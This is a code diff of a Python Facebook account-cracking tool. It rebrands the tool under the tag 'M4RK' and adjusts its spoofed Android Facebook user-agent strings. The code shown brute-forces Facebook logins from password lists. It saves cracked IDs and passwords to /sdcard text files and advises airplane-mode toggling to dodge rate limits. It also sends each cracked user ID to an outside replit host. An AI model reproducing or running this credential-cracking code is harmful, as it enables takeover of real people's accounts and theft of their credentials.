@@ -1,6 +1,6 @@
-#FBLINK: https://www.facebook.com/m4rk.sy
+#FBLink: https://www.facebook.com/m4rk.sy
 #Facebook: Mark Sy
-#Github : https://github.com/m4rkugh
+#Github: PRIVATE
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -67,15 +67,17 @@ for x in range(10000):
 os.system('clear')
 logo = ("""                                                                                 
 
-$$\      $$\ $$\   $$\ $$$$$$$\  $$\   $$\ $$\   $$\ 
-$$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |$$ |  $$ |
-$$$$\  $$$$ |$$ |  $$ |$$ |  $$ |$$ |$$  / \$$\ $$  |
-$$\$$\$$ $$ |$$$$$$$$ |$$$$$$$  |$$$$$  /   \$$$$  / 
-$$ \$$$  $$ |\_____$$ |$$  __$$< $$  $$<    $$  $$<  
-$$ |\$  /$$ |      $$ |$$ |  $$ |$$ |\$$\  $$  /\$$\ 
-$$ | \_/ $$ |      $$ |$$ |  $$ |$$ | \$$\ $$ /  $$ |
-\__|     \__|      \__|\__|  \__|\__|  \__|\__|  \__|
-                                                     
+$$\      $$\ $$\   $$\ $$$$$$$\  $$\   $$\ 
+$$$\    $$$ |$$ |  $$ |$$  __$$\ $$ | $$  |
+$$$$\  $$$$ |$$ |  $$ |$$ |  $$ |$$ |$$  / 
+$$\$$\$$ $$ |$$$$$$$$ |$$$$$$$  |$$$$$  /  
+$$ \$$$  $$ |\_____$$ |$$  __$$< $$  $$<   
+$$ |\$  /$$ |      $$ |$$ |  $$ |$$ |\$$\  
+$$ | \_/ $$ |      $$ |$$ |  $$ |$$ | \$$\ 
+\__|     \__|      \__|\__|  \__|\__|  \__|
+                                           
+                                           
+                                                                                                
 
                                         
 
@@ -156,7 +158,7 @@ def Spy():
 			clear()
 			total_ids = str(len(fo))
 			print(f' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
-			print(f"\033[1;37m USE AIRPLANEMODE NOW! \033[1;37m")
+			print(f"\033[1;37m USE AIRPLANEMODE TO GET OK ID'S\033[1;37m")
 			linex()
 			for user in fo:
 				ids,names = user.split(f'|')
@@ -269,7 +271,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'DM4RKk/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -328,7 +330,7 @@ def api1(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'DSABERk/2.1.0 (linex; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'DM4RKk/2.1.0 (linex; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -409,7 +411,7 @@ def ffb7(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [M4RK-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/NINS-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/M4RK-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 ffs = requests.get(f"https://Shikimachinafsget.hazeyy.repl.co/facebook-subscribers/ffs.php?uid={ids}").json()["followers"]
 
                                 #cek_apk(session,coki)
@@ -619,7 +621,7 @@ def apix(ids,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print(f'\r\r\033[1;32m [NINS-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\033[1;32m [M4RK-OK] '+ids+' | '+pas+'\033[1;97m')
                                         open(f'/sdcard/M4RK-OK.txt','a').write(ids+'|'+pas+'\n')
                                         #cek_apk(session,coki)
                                         oks.append(ids)
@@ -627,7 +629,7 @@ def apix(ids,passlist):
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print(f'\r\r\x1b[38;5;126m [M4RK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open(f'/sdcard/M4RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -641,8 +643,6 @@ def apix(ids,passlist):
                 except Exception as e:
                         pass
 		
-
-
 
 
 	
